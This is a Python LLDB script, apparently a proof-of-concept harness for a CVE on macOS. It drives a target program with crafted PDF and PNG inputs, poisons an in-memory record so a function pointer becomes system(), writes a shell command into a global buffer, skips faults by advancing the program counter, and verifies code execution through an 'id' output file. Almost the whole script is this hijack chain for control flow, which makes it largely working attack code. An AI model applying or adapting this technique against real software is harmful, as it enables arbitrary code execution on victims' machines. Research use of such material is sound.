# RIP-41: OFFSET-FREE GADGET (version-agnostic; built for macOS 26 lane).
# No +2540, no +1804, no store-site dependency. Chain:
#   marker2 -> capture g_rec + g_system/g_exit/g_cmd; write cmd; early poison.
#   decode2 runs naturally; generic fault-skipper keeps it alive on ANY layout.
#   marker3 -> re-poison record (post-revert window).
#   data_release_info ENTRY (x0==g_rec) -> WriteMemory rec+0x00=CMD, +0x18=system
#   DRI+24 -> x8 must be system (natural ldr) -> blraaz -> system(cmd) -> file.
#   Fallback belt: lr=exit for clean return after gadget.
import os, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
CVE = os.path.dirname(CWD) + "/cve-2026-86950"
TRACE = open(os.path.join(CWD, "rip41_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s + "\n"); TRACE.flush()
err = lldb.SBError()

def wait_stop(budget=40):
    st = p.GetState(); t0 = time.time()
    while st == lldb.eStateRunning:
        if time.time() - t0 > budget:
            try: p.Stop(); time.sleep(0.4); st = p.GetState()
            except Exception: return lldb.eStateKilled
            if st == lldb.eStateRunning:
                try: p.Kill()
                except Exception: pass
                return lldb.eStateKilled
            return st
        time.sleep(0.05); st = p.GetState()
    return st

def killp():
    try:
        if p and p.IsValid() and p.GetState() != lldb.eStateExited: p.Kill()
    except Exception: pass

def read_q(addr):
    if addr is None or addr < 0x100000: return None
    m = p.ReadMemory(addr, 8, err)
    return struct.unpack('<Q', m)[0] if err.Success() and m else None

import struct
def symn(fr):
    try: return fr.GetSymbol().GetName() or "?"
    except Exception: return "?"
def reg(fr, name):
    r = fr.FindRegister(name)
    return r.GetValueAsUnsigned() if r and r.IsValid() else 0
def global_addr(name):
    for sym in t.FindGlobalVariables(name, 1):
        try:
            a = sym.GetAddress().GetLoadAddress(t)
            if a and 0 < a < (1 << 48): return a
        except Exception: pass
    return None
def read_glob_ptr(name):
    a = global_addr(name)
    return read_q(a) if a else None

def poison_rec(rec):
    ok = []
    for off, val in ((0x00, CMD), (0x08, 0x424242424242), (0x10, 0x434343434343), (0x18, SYS)):
        n = p.WriteMemory(rec + off, struct.pack('<Q', val), err)
        ok.append(bool(err.Success() and n == 8))
    return all(ok)

R = SYS = CMD = None; sysfired = False; result = "incomplete"
b_m2 = t.BreakpointCreateByName("marker2")
b_m3 = t.BreakpointCreateByName("marker3")
b_dri = t.BreakpointCreateByName("data_release_info")
p = t.LaunchSimple(["k2_s1000.pdf", "r.png", "k2_d31472.pdf", "k2_s1000.pdf"], None, CVE)
if p and p.IsValid():
    skips = 0; lastfaults = {}
    for i in range(20000):
        st = wait_stop()
        if st != lldb.eStateStopped:
            result = "ended st=%s rc=%s at-i=%d" % (st, p.GetExitStatus() if p.IsValid() else -1, i)
            break
        fr = p.GetSelectedThread().GetSelectedFrame()
        nm = symn(fr)
        desc = p.GetSelectedThread().GetStopDescription(300) or ""
        if "marker2" in nm and R is None:
            R = read_glob_ptr("g_rec")
            SYS = read_glob_ptr("g_system")
            EXIT = read_glob_ptr("g_exit")
            CMD = global_addr("g_cmd")
            T("M2 R=%s SYS=%s EXIT=%s CMD=%s" % (hex(R) if R else None, hex(SYS) if SYS else None, hex(EXIT) if EXIT else None, hex(CMD) if CMD else None))
            if R and SYS and CMD:
                try:
                    n = p.WriteMemory(CMD, b"/usr/bin/id > /tmp/rip41_id.txt 2>&1\x00", err)
                    T("cmd->g_cmd n=%s ok=%s" % (n, err.Success()))
                    T("early-poison ok=%s" % poison_rec(R))
                except Exception as e:
                    T("m2 write EXC %s" % e)
            p.Continue()
        elif "marker3" in nm:
            if R and SYS and CMD:
                T("M3 pre-verify rec+0x18=%s" % (hex(read_q(R + 0x18)) if read_q(R + 0x18) else None))
                T("M3 re-poison ok=%s" % poison_rec(R))
            p.Continue()
        elif "data_release_info" in nm:
            try:
                a2 = fr.GetPCAddress().GetLoadAddress(t)
                base = fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
                off = a2 - base
            except Exception:
                off = -1
            x0 = reg(fr, "x0")
            if off == 24:
                x8 = reg(fr, "x8")
                if x8 == SYS and not sysfired:
                    sysfired = True
                    T("DRI+24 x8=system NATURAL — GADGET FIRES NOW")
                    if EXIT:
                        fr.FindRegister("lr").SetValueFromCString("0x%x" % EXIT)
                        T("lr->exit armed (clean return)")
                else:
                    T("DRI+24 x8=%x sys=%s" % (x8, hex(SYS) if SYS else None))
                p.Continue()
            elif off <= 4 and R and x0 == R and SYS and CMD:
                okp = poison_rec(x0)
                T("DRI-ENTRY poison ok=%s rec=%s" % (okp, hex(x0)))
                p.Continue()
            else:
                p.Continue()
        elif "EXC_BAD_ACCESS" in desc and "aa_cache_render" in nm:
            pc = reg(fr, "pc")
            key = (pc, desc[-30:])
            lastfaults[key] = lastfaults.get(key, 0) + 1
            if skips < 40000 and pc:
                try:
                    base = fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
                    soff = pc - base
                    fr.FindRegister("pc").SetValueFromCString("0x%x" % (pc + 4))
                    skips += 1
                    if skips <= 5 or skips % 500 == 0:
                        T("skip#%d off=%d addr-in-desc=%s" % (skips, soff, desc[-40:]))
                except Exception: pass
            p.Continue()
        else:
            pc = reg(fr, "pc")
            if sysfired:
                time.sleep(1.5)
                try: out = open("/tmp/rip41_id.txt").read().strip()
                except Exception as e: out = "READ-FAIL %s" % e
                T("POST-CALL pc=%x file: %r" % (pc, out[:150]))
                result = ("CODE-EXEC-DEMO system() via poisoned record: " + out[:70]) if "uid=" in out else "GADGET-FIRED-no-file"
                killp(); break
            if i % 500 == 0:
                T("DBG i=%d nm=%s desc=%s" % (i, nm[:36], desc[:70]))
            p.Continue()
    killp()
for b in (b_m2, b_m3, b_dri):
    try: t.BreakpointDelete(b.GetID())
    except Exception: pass
time.sleep(1.0)
try: out = open("/tmp/rip41_id.txt").read().strip()
except Exception as e: out = "READ-FAIL %s" % e
if "uid=" in out and "CODE-EXEC" not in result:
    result = "CODE-EXEC-DEMO (file-verified): " + out[:70]
T("RESULT: %s" % result)
T("RIP-41 DONE")
TRACE.close()
